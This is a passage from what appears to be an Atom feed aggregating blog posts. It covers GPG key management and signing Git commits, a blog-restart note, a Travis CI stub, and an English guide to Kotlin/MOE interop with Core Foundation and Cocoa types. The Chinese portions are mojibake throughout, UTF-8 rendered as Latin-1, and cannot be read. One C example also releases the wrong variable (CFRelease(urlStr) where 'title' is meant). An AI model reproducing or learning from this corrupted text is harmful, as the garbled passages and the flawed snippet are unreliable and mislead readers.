ä»½è¯ä¹¦çš„è¯ï¼Œé‚£ä¹ˆä»–å°±èƒ½ä½¿ç”¨å®ƒå¹¶è®©æ‚¨çš„å¯†é’¥æ— æ³•ç»§ç»­ä½¿ç”¨ã€‚æŠŠæ­¤è¯ä¹¦
æ‰“å°å‡ºæ¥å†å­˜æ”¾åˆ°å®‰å…¨çš„åœ°æ–¹ä¹Ÿæ˜¯å¾ˆå¥½çš„æ–¹æ³•ï¼Œä»¥å…æ‚¨çš„ä¿å­˜åª’ä½“å˜å¾—
ä¸å¯è¯»ã€‚ä½†æ˜¯åƒä¸‡å°å¿ƒï¼šæ‚¨æœºå™¨ä¸Šçš„æ‰“å°ç³»ç»Ÿå¯èƒ½ä¼šåœ¨æ‰“å°è¿‡ç¨‹ä¸­å‚¨å­˜
è¿™äº›æ•°æ®ï¼Œå¹¶ä½¿å¾—å…¶ä»–äººçœ‹åˆ°ï¼
</code></pre></div><p>åªéœ€è¦ä¿å­˜ä¸­é—´çš„åŠé”€è¯ä¹¦ï¼Œå½“å¯†é’¥æ³„éœ²æ—¶å°†å…¶å‘é€åˆ°å…¬é’¥æœåŠ¡å™¨ï¼Œå°±å¯ä»¥åŠé”€æ—§å¯†é’¥</p>
<h3 id="ç¼–è¾‘å¯†é’¥">ç¼–è¾‘å¯†é’¥</h3>
<p>æœ‰æ—¶å€™éœ€è¦å¯¹å¯†é’¥è¿›è¡Œç¼–è¾‘ï¼Œå¦‚ä¿®æ”¹ä¿¡ä»»åº¦ï¼Œç”Ÿæˆå­å¯†é’¥ç­‰ï¼Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">gpg --edit-key naive
</code></pre></div><p>æ¥ç€å°±ä¼šè¿›å…¥äº¤äº’æ¨¡å¼ç­‰å¾…å‘½ä»¤ï¼Œè¾“å…¥<code>help</code>å¯ä»¥æŸ¥çœ‹æ‰€æœ‰æ“ä½œ</p>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">gpg (GnuPG/MacGPG2) 2.2.17; Copyright (C) 2019 Free Software Foundation, Inc.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

ç§é’¥å¯ç”¨ã€‚

sec  rsa2048/4C26D2E451FFDAF1
     åˆ›å»ºäºï¼š2020-04-02  æœ‰æ•ˆè‡³ï¼šæ°¸ä¸       å¯ç”¨äºï¼šSC
     ä¿¡ä»»åº¦ï¼šç»å¯¹        æœ‰æ•ˆæ€§ï¼šç»å¯¹
ssb  rsa2048/A86AB46BDC677F8F
     åˆ›å»ºäºï¼š2020-04-02  æœ‰æ•ˆè‡³ï¼šæ°¸ä¸       å¯ç”¨äºï¼šE
[ ç»å¯¹ ] (1). naive (too young too simple) &lt;naive@test.com&gt;

gpg&gt;
</code></pre></div><h2 id="ä½¿ç”¨-gpg-ç­¾å-git-commit">ä½¿ç”¨ GPG ç­¾å Git Commit</h2>
<p>è¿™å°±æ˜¯æˆ‘ä½¿ç”¨ GPG çš„åŸå› ï¼Œä¸‹é¢å¼€å§‹é…ç½®ï¼Œé¦–å…ˆé…ç½® git</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="c1"># è®¾ç½®å…¨å±€é»˜è®¤å¯†é’¥</span>
git config --global user.signingkey &lt;å¯†é’¥ID&gt;

<span class="c1"># è®¾ç½®å¼ºåˆ¶ä½¿ç”¨GPGç­¾å</span>
git config --global commit.gpgsign <span class="nb">true</span>
</code></pre></div><p>ä¹‹ååœ¨æäº¤æ—¶ï¼Œåªéœ€è¦å¸¦ä¸Š<code>-S</code>å‚æ•°ï¼Œå°±èƒ½å¯¹æäº¤è¿›è¡Œç­¾å</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">git commit -S -m <span class="s2">&#34;xxx&#34;</span>
</code></pre></div><p>æŸ¥çœ‹ git æ—¥å¿—æ—¶ï¼Œå¸¦ä¸Š<code>--show-signature</code>å‚æ•°å°±èƒ½çœ‹åˆ°ç­¾åä¿¡æ¯</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">git log --show-signature
</code></pre></div><p>æœ€åä¸€æ­¥ï¼Œéœ€è¦æŠŠä½ çš„å…¬é’¥æäº¤åˆ° githubï¼Œå¦åˆ™å®ƒæ€ä¹ˆçŸ¥é“è¿™ä¸ªç­¾åæ˜¯ä½ çš„å‘¢ï¼Ÿå°†ä¹‹å‰ç”Ÿæˆçš„æ–‡æœ¬ç±»å‹çš„å…¬é’¥<code>public_key.txt</code>æäº¤åˆ° <a href="https://github.com/settings/keys">github</a>ï¼Œä¹‹åä½ çš„æäº¤åœ¨ github ä¸Šå°±æœ‰åƒå¼€å¤´é‚£æ ·çš„ç»¿è‰²å°å‹¾äº†</p>
<h2 id="faq">FAQ</h2>
<h3 id="è§£å†³gitæäº¤æ—¶å‡ºç°error-gpg-failed-to-sign-the-data">è§£å†³gitæäº¤æ—¶å‡ºç°<code>error: gpg failed to sign the data</code></h3>
<p>ä»¥ä¸‹æ˜¯åŸå§‹è§£å†³æ–¹æ¡ˆï¼Œè™½ç„¶èƒ½è§£å†³é—®é¢˜ï¼Œä½†ä½“éªŒä¸å¥½ï¼Œåœ¨ IDE ä¸­æäº¤æ—¶éš¾ä»¥è¾“å…¥å¯†ç ï¼Œå»ºè®® MacOS ç”¨æˆ·é‡‡ç”¨ä¸Šé¢è¯´çš„ <code>GPG Suite</code>è¿›è¡Œæ“ä½œï¼Œå®ƒå¯ä»¥æ¥ç®¡å¯†ç è¾“å…¥æ“ä½œï¼Œå¼¹å‡ºä¸€ä¸ªç‹¬ç«‹çª—å£ç”¨äºè¾“å…¥ï¼Œè¿˜èƒ½å°†å¯†ç æ·»åŠ åˆ° iCloud é’¥åŒ™ä¸²ä¸­ï¼Œé¿å…é‡å¤è¾“å…¥å¯†ç ã€‚å¦‚æœä½ å·²ç»åœ¨ä½¿ç”¨<code>GPG Suite</code>ï¼Œä½†ä»ç„¶é‡åˆ°äº†è¿™ä¸ªé—®é¢˜ï¼Œå¯ä»¥å°è¯•é‡è£…<code>GPG Suite</code></p>
<ol>
<li>
<p>å¯¼å‡ºå¯†é’¥ï¼ˆç§é’¥ï¼‰<strong>é‡è¦</strong></p>
</li>
<li>
<p>å¸è½½ GPG</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">brew uninstall gnupg gnutls
   
brew cask uninstall gpg-suite
</code></pre></div></li>
<li>
<p>åˆ é™¤ gpg æ–‡ä»¶å¤¹ï¼Œ<strong>è¯·ç¡®è®¤å·²ç»å¯¼å‡ºå¯†é’¥</strong></p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">rm -rf ~/.gnupg
</code></pre></div></li>
<li>
<p>é‡æ–°å®‰è£…<code>GPG Suite</code>ï¼Œ<strong>ä¸éœ€è¦æ‰‹åŠ¨å®‰è£… GPG</strong></p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell">brew cask install gpg-suite
</code></pre></div></li>
<li>
<p>å¯¼å…¥å¯†é’¥</p>
</li>
</ol>
<p>è¿™æ—¶ <code>GPG Suite</code>åº”è¯¥å·²ç»å¯ä»¥æ­£å¸¸å·¥ä½œäº†</p>
<hr>
<p><em>åŸå§‹æ–¹æ¡ˆ</em></p>
<p>é¦–å…ˆæµ‹è¯•<code>gpg</code>å·¥ä½œæ˜¯å¦æ­£å¸¸</p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="nb">echo</span> <span class="s2">&#34;test&#34;</span> <span class="p">|</span> gpg --clearsign
</code></pre></div><p>å¦‚æœå‡ºç°ä¸‹é¢çš„é”™è¯¯</p>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256

test
gpg: ç­¾åæ—¶å¤±è´¥ï¼š Inappropriate ioctl for device
gpg: [stdin]: clear-sign failed: Inappropriate ioctl for device
</code></pre></div><p>è¯´æ˜<code>gpg</code>æ— æ³•æ‰“å¼€è¾“å…¥å¯†ç çš„çª—å£ã€‚åœ¨ç”Ÿæˆ<code>gpg key</code>æ—¶ï¼Œå¦‚æœæŒ‡å®šäº†å¯†ç ï¼Œåœ¨ç­¾åæ—¶å°±éœ€è¦è¾“å…¥ã€‚è€Œè¿™æ—¶<code>gpg</code>ä¸çŸ¥é“ä»å“ªé‡Œè¯»å–è¾“å…¥ï¼Œæ‰€ä»¥å¯ä»¥ç”¨ä»¥ä¸‹çš„å‘½ä»¤æŒ‡å®š<code>tty</code></p>
<div class="highlight"><pre class="chroma"><code class="language-shell" data-lang="shell"><span class="nb">export</span> <span class="nv">GPG_TTY</span><span class="o">=</span><span class="k">$(</span>tty<span class="k">)</span> 
</code></pre></div><p>è¿™æ ·å°±å¯ä»¥æ­£å¸¸å¼¹å‡ºè¾“å…¥å¯†ç çš„çª—å£ã€‚</p>
<hr>
<p>ä½†æˆ‘ä¸å–œæ¬¢è¿™ä¸ªå…¨å±çª—å£ï¼Œä¸»è¦æ˜¯åœ¨macä¸Š<code>gpg</code>è¯­è¨€ä¸ºä¸­æ–‡æ—¶ï¼Œè¿™ä¸ªçª—å£ä¼šä¹±ç ï¼Œæ‰€ä»¥ç”¨å¦ä¸€ä¸ªæ–¹æ³•è§£å†³ã€‚ç¼–è¾‘<code>~/.gnupg/gpg.conf</code>ï¼Œæ·»åŠ ä»¥ä¸‹å†…å®¹</p>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">use-agent 
pinentry-mode loopback
</code></pre></div><p>å†ç¼–è¾‘<code>~/.gnupg/gpg-agent.conf</code>ï¼Œæ·»åŠ ä»¥ä¸‹å†…å®¹</p>
<div class="highlight"><pre class="chroma"><code class="language-text" data-lang="text">allow-loopback-pinentry
</code></pre></div><p>æœ€åè¾“å…¥<code>echo RELOADAGENT | gpg-connect-agent</code>é‡å¯<code>agent</code>å°±ç”Ÿæ•ˆäº†ï¼Œè¿™æ ·å¯ä»¥ç›´æ¥åœ¨ç»ˆç«¯è¾“å…¥å¯†ç </p>
<blockquote>
<p><a href="https://d.sb/2016/11/gpg-inappropriate-ioctl-for-device-errors">source</a></p>
</blockquote>]]></content>
        <author>
            <name><![CDATA[Creedowlâ€™s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.creedowl.com/posts/renew/</id>
        <title><![CDATA[é‡æ–°å¼€å§‹]]></title>
        <updated>2020-03-19T13:28:13+08:00</updated>
        <link href="https://blog.creedowl.com/posts/renew/"/>
        <content type="text/html" src="https://blog.creedowl.com/posts/renew/"><![CDATA[<p>çªç„¶å‘ç°è·ä¸Šä¸€ç¯‡blogå‘å¸ƒå·²ç»è¿‡å»äº†å¿«ä¸€å¹´çš„æ—¶é—´ï¼ŒåŸå…ˆçš„blogä¹Ÿç–äºæ‰“ç†ï¼Œåªæœ‰å¯¥å¯¥å‡ ç¯‡æ–‡ç« ï¼Œå›¾åºŠåŸºæœ¬å¤±æ•ˆã€‚ä¸»è¦å› ä¸ºæˆ‘æ¯”è¾ƒæ‡’ï¼Œè®¤çœŸæ•´ç†ä¸€ç¯‡blogä¹Ÿæ˜¯è´¹æ—¶è´¹åŠ›çš„äº‹æƒ…ã€‚ä½†è‡ªå·±æ•´ç†ä¸€äº›æ–‡ç« æ˜¯å¾ˆæœ‰æ„ä¹‰çš„äº‹æƒ…ï¼Œèƒ½è®°å½•ä¸‹è‡ªå·±çš„å­¦ä¹ å†ç¨‹ï¼Œæ€»ç»“çŸ¥è¯†ï¼Œå†æ¬¡é‡åˆ°ç›¸åŒçš„é—®é¢˜ä¹Ÿå¯ä»¥å›å¤´å‚è€ƒã€‚</p>
<p>blogä¸€ç›´æ²¡æ›´æ–°æœ‰ä¸ªè¯±å› æ˜¯å¾®åšå›¾åºŠå¼€å¯äº†é˜²ç›—é“¾ï¼Œå¯¼è‡´blogä¸­è®¸å¤šå›¾ç‰‡éƒ½æ— æ³•è®¿é—®äº†<del>è€ç‹èƒŒé”…</del>ï¼Œåˆæ‡’å¾—ä¿®å¤ã€‚åŒæ—¶çœ‹ä¸Šäº†<a href="https://gohugo.io/">hugo</a>è¿™ä¸ªæ¡†æ¶ï¼Œæ­£å¥½ä¹Ÿåœ¨å­¦ä¹ <code>golang</code>ï¼Œå°±æƒ³ä»<code>hexo</code>æ›´æ¢åˆ°<code>hugo</code>ã€‚ä½†è¿™ä¸¤ä¸ªæ¡†æ¶æœ‰ä¸ªå¾ˆå¤§çš„åŒºåˆ«<del>æˆ‘è§‰å¾—</del>ï¼Œå°±æ˜¯<code>hexo</code>æ˜¯ä¸€å †å‰ç«¯å·¥ç¨‹å¸ˆæçš„ï¼Œè€Œ<code>hugo</code>æ˜¯ä¸€å †åç«¯å·¥ç¨‹å¸ˆæçš„ï¼Œè¿™å°±å¯¼è‡´äº†<code>hugo</code>æ²¡æœ‰å•¥å¥½çœ‹çš„ä¸»é¢˜ï¼Œä¹Ÿå°±ä¸€ç›´é¸½ä¸‹å»äº†ã€‚</p>
<p>å»å¹´å¹´ä¸­çš„æ—¶å€™å°±æ‰“ç®—å’Œ@queensferryå†™ä¸€ä¸ªHugoä¸»é¢˜<a href="https://github.com/queensferryme/hugo-theme-verse">verse</a>ï¼Œç«‹é¡¹çš„æ—¶å€™å¾ˆå¤šæƒ³æ³•ï¼Œä½†åšèµ·æ¥å°±ä¸æƒ³åŠ¨äº†ã€‚æ‘¸å®Œé¡µé¢æ¡†æ¶åå°±é¸½äº†ï¼Œä¸€æ–¹é¢å®åœ¨ä¸ä¼šè®¾è®¡ï¼Œå¦ä¸€æ–¹é¢è°ƒå„ç§æ ·å¼æ˜¯çœŸçš„è›‹ç–¼ã€‚é¸½äº†åŠå¹´åˆæ¡èµ·æ¥<del>è™½ç„¶æˆ‘æ²¡å†™å•¥</del>ï¼Œä¸è¿‡æ¸æ¸ä¹Ÿæœ‰ç‚¹æ ·å­äº†ã€‚ä½†ä»Šå¤©å‘ç°äº†ä¸€ä¸ªå¾ˆæ£’çš„ä¸»é¢˜<a href="https://github.com/Track3/hermit">hermit</a>ï¼Œå‡ ä¹å°±æ˜¯æˆ‘æƒ³è¦çš„ï¼Œé‡Œé¢å¾ˆå¤šè®¾è®¡å°±æ˜¯æˆ‘å½“åˆæ„æƒ³çš„å†…å®¹ï¼Œé©¬ä¸Šæ¡èµ·äº†blogã€‚</p>
<p>è¿™ä¸€å¹´æ¥ä¹Ÿè®¡åˆ’æ•´ç†ä¸ªäººç¬”è®°è½¯ä»¶ï¼Œåœ¨å°è¯•äº†æ•°ä¸ªè½¯ä»¶åï¼Œæœ‰å°è±¡ç¬”è®°ï¼Œä¸ºçŸ¥ç¬”è®°ï¼Œæœ‰é“äº‘ç¬”è®°ï¼ŒonenoteåŠä¸€å †å¼€æºç¬”è®°åº”ç”¨ï¼Œéƒ½ä¸å¤ªæ»¡è¶³æˆ‘çš„éœ€æ±‚ã€‚æœ€åå‘ç°äº†notionè¿™ä¸ªä¸œè¥¿è´¼é¦™ï¼ˆä¸»è¦å¯¹å­¦ç”Ÿå…è´¹äº†ï¼‰ï¼Œæœ€åå°±é€‰æ‹©äº†å®ƒã€‚ä¸è¿‡è¿™ä¹Ÿå¯¼è‡´æˆ‘æ‰‹ä¸Šä¸€å †ç¬”è®°åˆ†æ•£åœ¨å„å¤„ï¼Œæ‰“ç®—åé¢æ•´ç†æ¸…æ¥š<del>æ°´</del>å‡ ç¯‡blogå‡ºæ¥ã€‚</p>]]></content>
        <author>
            <name><![CDATA[Creedowlâ€™s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>http://blog.qrzbing.cn/post/from-0-to-travis/</id>
        <title><![CDATA[ä½¿ç”¨ Travis CI è‡ªåŠ¨éƒ¨ç½² Hexo åšå®¢]]></title>
        <updated>2019-10-01T20:28:15+08:00</updated>
        <link href="http://blog.qrzbing.cn/post/from-0-to-travis/"/>
        <content type="text/html" src="http://blog.qrzbing.cn/post/from-0-to-travis/"><![CDATA[<p>æœ€è¿‘ä¸€ç›´åœ¨ Manjaro å’Œ Windows ä¹‹é—´åˆ‡æ¢ï¼Œç°åœ¨å­¦ä¹ éƒ½å·²ç»åœ¨ Manjaro ä¸Šè¿›è¡Œäº†ï¼Œä½†æ˜¯åšå®¢è¿˜åœ¨ Windows ä¸Šã€‚è™½ç„¶è¿ç§»è¿‡æ¥å¹¶ä¸éš¾ï¼Œä½†è¿˜æ˜¯å¤ªéº»çƒ¦äº†ã€‚å¦å¤–å†™åšå®¢è¿˜è¦å¼€ç”µè„‘ï¼Œçš„ç¡®æœ‰ç‚¹éº»çƒ¦ã€‚ä½œä¸ºä¸€ä¸ªæ‡’äººå½“ç„¶æ˜¯åŠ¨åŠ¨æ‰‹è‡ªåŠ¨æ¨é€æœ€å¥½ï¼Œæˆ‘å°±æƒ³åˆ°äº†ç”¨ <a href="https://travis-ci.org/">Travis CI</a> æ¥è‡ªåŠ¨éƒ¨ç½²åšå®¢ã€‚</p>]]></content>
        <author>
            <name><![CDATA[QRZâ€™s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://www.noisyfox.io/moe-native-types.html</id>
        <title><![CDATA[Working with native types: Advanced]]></title>
        <updated>2019-09-22T05:23:17+08:00</updated>
        <link href="https://www.noisyfox.io/moe-native-types.html"/>
        <content type="text/html" src="https://www.noisyfox.io/moe-native-types.html"><![CDATA[<p>After using MOE for several years we discovered some common problems when dealing with native types (Core Foundation Types &amp; Cocoa Types). Here are some of our findings.</p>



<h1>Container Types (NSArray, NSDictionary, CFArrayRef, etc.)</h1>



<ol><li>The content in those containers must be corresponding native types, e.g., values of a <code>NSArray</code> must all be <code>NSObject</code>s, while values of a <code>CFArrayRef</code> must all be <code>OpaquePtr</code>s.<ol><li>NatJ does not automatically convert Java-only types (include primitive types) to compatible native types and vice versa when dealing with containers. When adding values to those containers you need to manually convert it to a corresponding native type. And when reading the value you also need to explicitly convert it to a Java type.</li><li>If you try to store a <strong>Core Foundation</strong> type in a <strong>Cocoa</strong> container, you need to cast it using the <strong>Toll-Free Bridging</strong> which I will talk about later.</li></ol></li><li>Arrays and dictionaries can not have <code>null</code> as either key or value.</li></ol>



<p>If you ever used the iOS <strong>KeyChain</strong> APIs you may did something similar as follows in Objective-C(simplified):</p>



<pre class="EnlighterJSRAW" data-enlighter-language="kotlin" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">CFErrorRef error = NULL;

SecAccessControlRef access =
SecAccessControlCreateWithFlags(kCFAllocatorDefault,
                                kSecAttrAccessibleWhenUnlockedThisDeviceOnly,
                                kSecAccessControlPrivateKeyUsage|kSecAccessControlUserPresence,
                                &amp;error);

NSData* tag = [@"some tag" dataUsingEncoding:NSUTF8StringEncoding];

NSDictionary* attributes =
@{ (id)kSecClass:                   (id)kSecClassKey,
   (id)kSecAttrKeyType:             (id)kSecAttrKeyTypeECSECPrimeRandom,
   (id)kSecAttrKeySizeInBits:       @256,
   (id)kSecAttrTokenID:             (id)kSecAttrTokenIDSecureEnclave,
   (id)kSecPrivateKeyAttrs:
       @{ (id)kSecAttrIsPermanent:    @YES,
          (id)kSecAttrApplicationTag:  tag,
          (id)kSecAttrAccessControl:  (__bridge id)access
        },
   };

SecKeyRef privateKey = SecKeyCreateRandomKey((__bridge CFDictionaryRef)attributes,
                                             &amp;error);</pre>



<p>The corresponding Kotlin code will be:</p>



<pre class="EnlighterJSRAW" data-enlighter-language="kotlin" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">val pError = PtrFactory.newOpaquePtrReference(CFErrorRef::class.java)

val access = Security.SecAccessControlCreateWithFlags(
    CoreFoundation.CFAllocatorGetDefault(),
    Security.kSecAttrAccessibleWhenUnlockedThisDeviceOnly(),
    SecAccessControlCreateFlags.PrivateKeyUsage or SecAccessControlCreateFlags.UserPresence,
    pError
)
val tag = NSString.stringWithString("some tag").dataUsingEncoding(NSUTF8StringEncoding)

// Helper function to convert a CF type to Cocoa type
fun OpaquePtr.toNSObject() = ObjCRuntime.cast(this, NSObject::class.java)

val privateKeyAttrs = NSMutableDictionary.dictionary&lt;Any, Any>() as NSMutableDictionary&lt;Any, Any>
privateKeyAttrs[Security.kSecAttrIsPermanent().toNSObject()] = NSNumber.numberWithBool(true) // Convert Java `boolean` to Cocoa type
privateKeyAttrs[Security.kSecAttrApplicationTag().toNSObject()] = tag
privateKeyAttrs[Security.kSecAttrAccessControl().toNSObject()] = access.toNSObject()

val attributes = NSMutableDictionary.dictionary&lt;Any, Any>() as NSMutableDictionary&lt;Any, Any>
attributes[Security.kSecClass().toNSObject()] = Security.kSecClassKey().toNSObject()
attributes[Security.kSecAttrKeyType().toNSObject()] = Security.kSecAttrKeyTypeECSECPrimeRandom().toNSObject()
attributes[Security.kSecAttrKeySizeInBits().toNSObject()] = NSNumber.numberWithInt(256) // Convert Java `int` to Cocoa type
attributes[Security.kSecAttrTokenID().toNSObject()] = Security.kSecAttrTokenIDSecureEnclave().toNSObject()
attributes[Security.kSecPrivateKeyAttrs().toNSObject()] = privateKeyAttrs

// Cast NSDictionary to CFDictionaryRef
val cfAttributes = ObjCRuntime.cast(attributes, CFDictionaryRef::class.java)

val privateKey = Security.SecKeyCreateRandomKey(cfAttributes, pError)</pre>



<p>With the help of <a href="https://github.com/Noisyfox/NatJ-Kotlin">this library</a> I created, the code can be simplified as:</p>



<pre class="EnlighterJSRAW" data-enlighter-language="kotlin" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">val pError = PtrFactory.newOpaquePtrReference(CFErrorRef::class.java)

val access = Security.SecAccessControlCreateWithFlags(
    CoreFoundation.CFAllocatorGetDefault(),
    Security.kSecAttrAccessibleWhenUnlockedThisDeviceOnly(),
    SecAccessControlCreateFlags.PrivateKeyUsage or SecAccessControlCreateFlags.UserPresence,
    pError
)

val attributes = mapOf&lt;Any,Any>(
    Security.kSecClass() to Security.kSecClassKey(),
    Security.kSecAttrKeyType() to Security.kSecAttrKeyTypeECSECPrimeRandom(),
    Security.kSecAttrKeySizeInBits() to 256,
    Security.kSecAttrTokenID() to Security.kSecAttrTokenIDSecureEnclave(),
    Security.kSecPrivateKeyAttrs() to mapOf&lt;Any,Any>(
        Security.kSecAttrIsPermanent() to true,
        Security.kSecAttrApplicationTag() to "some tag".toNSData(),
        Security.kSecAttrAccessControl() to access
    )
).toNSDictionary()

val privateKey = Security.SecKeyCreateRandomKey(attributes.bridge(), pError)</pre>



<p>This library also has a help function for creating <code>NSArray</code> from a Java <code>Collection</code>:</p>



<pre class="EnlighterJSRAW" data-enlighter-language="kotlin" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">val nsArray = listOf(1, 2, 3, "some string", someCFRef, someNSType).toNSArray()</pre>



<h1>Toll-Free Bridging &amp; Memory Management</h1>



<p>iOS developers are most likely to be familiar with&nbsp;<strong>Cocoa Touch</strong>&nbsp;frameworks/APIs (does&nbsp;<strong>Foundation</strong>&nbsp;framework sound familiar to you?), which use the programming languages&nbsp;<strong>Objective-C</strong>&nbsp;or&nbsp;<strong>Swift</strong>. </p>



<p>However, you may also heard about another framework called&nbsp;<strong>Core Foundation</strong>.&nbsp;It is a pure&nbsp;<strong>C</strong>&nbsp;framework and provides access to lower level APIs and types.</p>



<p>For iOS development, most frameworks you will use are all designed based on the&nbsp;<strong>Foundation</strong>&nbsp;framework which means the types they use are all&nbsp;<code>NSObject</code>s so&nbsp;<strong>ARC</strong>&nbsp;manages the memory for you and the memory will be automatically released when the object is no longer used.&nbsp;<strong>MOE</strong> does some tricks so&nbsp;<strong>Java</strong>&#8216;s&nbsp;<strong>GC</strong>&nbsp;also helps when you use those types on&nbsp;<strong>Java</strong>&nbsp;side.</p>



<p>However some low level functions (such as&nbsp;<strong>Security</strong>&nbsp;framework if you try to use&nbsp;<strong>TouchId</strong>) are available in only&nbsp;<strong>C</strong>&nbsp;functions. Hens they use&nbsp;<strong>Core Foundation</strong>&nbsp;types which does not have&nbsp;<strong>ARC</strong>&nbsp;and requires manual memory management. Sadly&nbsp;<strong>Java</strong>&#8216;s&nbsp;<strong>GC</strong>&nbsp;does no help here (and may even create new issues which I will talk about later).</p>



<h2 id="ownership-cfretain-and-cfrelease">Ownership, CFRetain() and CFRelease()</h2>



<p>Anyone has any&nbsp;<strong>C</strong>&nbsp;experience might still remember those good old days struggling with&nbsp;<code>malloc()</code>&nbsp;and&nbsp;<code>free()</code>&nbsp;while&nbsp;<strong>Core Foundation</strong>&nbsp;brings you&nbsp;<code>CFRetain()</code>&nbsp;and&nbsp;<code>CFRelease()</code>.</p>



<p>Apple has a fantastic document that tells you how&nbsp;<em>Ownership</em>&nbsp;works in manual memory management and when you should use&nbsp;<code>CFRetain()</code>and&nbsp;<code>CFRelease()</code>&nbsp;respectively. I highly recommend you to read it first:</p>



<p>Link:&nbsp;<a href="https://developer.apple.com/library/archive/documentation/CoreFoundation/Conceptual/CFMemoryMgmt/Concepts/Ownership.html">Memory Management Programming Guide for Core Foundation &#8211; Ownership Policy</a></p>



<p>Basically if an Core Foundation object is owned by you, you need to call&nbsp;<code>CFRelease()</code>&nbsp;once you are done with it; if it&#8217;s NOT owned by you, in most cases, you need to&nbsp;<code>CFRetain()</code>&nbsp;it, use it, then&nbsp;<code>CFRelease()</code>&nbsp;it afterwards:</p>



<pre class="EnlighterJSRAW" data-enlighter-language="c" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">// Create a CFString, which is owned by you
CFStringRef urlStr = CFStringCreateWithCString(kCFAllocatorDefault,
    "https://www.noisyfox.io", kCFStringEncodingUTF8);

/* Do something with urlStr here. */

// Release it afterwards
CFRelease(urlStr);
</pre>



<pre class="EnlighterJSRAW" data-enlighter-language="c" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">// Get something from a dict, which is not owned, so a CFRetain() is required
CFStringRef title = (CFStringRef)CFRetain(CFDictionaryGetValue(dict, CFSTR("title")));

/* Do something with title here. */

// Release it afterwards
CFRelease(urlStr);
</pre>



<p>You can easily convert above code to&nbsp;<strong>Java</strong>&nbsp;since MOE bindings provide all necessary functions. And with a little help from my library, you could write something like these in&nbsp;<strong>Kotlin</strong>:</p>



<pre class="EnlighterJSRAW" data-enlighter-language="kotlin" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">CFStringCreateWithCString(kCFAllocatorDefault(), "title", CFStringBuiltInEncodings.UTF8).use { key ->

    CFDictionaryGetValue(dict, key).cast&lt;CFStringRef>().retain().use { title ->
        /* Do something with title here. */
    }
}
// CFRelease is automatically called when block returns
</pre>



<p>The&nbsp;<code>action</code>&nbsp;block of&nbsp;<code>.use()</code>&nbsp;is wrapped in a&nbsp;<code>try</code>&nbsp;block so the resource is guaranteed to be released even if&nbsp;<strong>Exception</strong>&nbsp;is raised in the block.</p>



<h2 id="autoreleasepool-for-core-foundation-types"><code>autoreleasepool</code>&nbsp;for&nbsp;<strong>Core Foundation</strong>&nbsp;types</h2>



<p><code>.use()</code>&nbsp;mentioned above will create a lot of nested scopes if you have a lot of those&nbsp;<strong>Core Foundation</strong>&nbsp;objects. That makes the code unreadable. With the help of&nbsp;<code>autoreleasepool</code>&nbsp;you could rewrite the above code to something like this:</p>



<pre class="EnlighterJSRAW" data-enlighter-language="kotlin" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">autoreleasepool {
    val key = CFStringCreateWithCString(kCFAllocatorDefault(), "title", CFStringBuiltInEncodings.UTF8).autorelease()
    val title = CFDictionaryGetValue(dict, key).cast&lt;CFStringRef>().retain().autorelease()

    /* Do something with title here. */
}
// CFRelease is automatically called for each object that called .autorelease() when autoreleasepool block ends
</pre>



<p><strong>NB</strong>: Make sure the&nbsp;<code>autoreleasepool</code>&nbsp;you called is imported from package&nbsp;<code>io.noisyfox.moe.natj</code>&nbsp;since&nbsp;<strong>NatJ</strong>&nbsp;has it&#8217;s own impl&nbsp;<code>org.moe.natj.objc.ObjCRuntime#autoreleasepool(java.lang.Runnable)</code>&nbsp;which is not a&nbsp;<strong>Kotlin</strong>&nbsp;<code>inline</code>&nbsp;function which doesn&#8217;t support certain features (such as&nbsp;<a href="https://kotlinlang.org/docs/reference/inline-functions.html#non-local-returns">non-local returns</a>&nbsp;and&nbsp;<a href="https://kotlinlang.org/docs/reference/inline-functions.html#reified-type-parameters">reified type parameters</a>).</p>



<h2 id="type-bridging">Type Bridging</h2>



<p>WIP</p>



<h1>Misc</h1>



<p>The library also contains some other help functions for converting between Java types and native types such as <code>ByteArray</code> &lt;=&gt; <code>NSData</code>. I won&#8217;t list all functions here since you could easily find them in source code.</p>



<h1>The library &#8211; <strong><a href="https://github.com/Noisyfox/NatJ-Kotlin">NatJ-Kotlin</a></strong></h1>



<p>This is a library I created that contains some helper functions I used in my work. It&#8217;s currently available in only source code form. I will create a jar release and publish it to jcenter ASAP.</p>



<p>The library is written in Kotlin but most of the functions can also be used in Java.</p>



<h1>Discussion</h1>



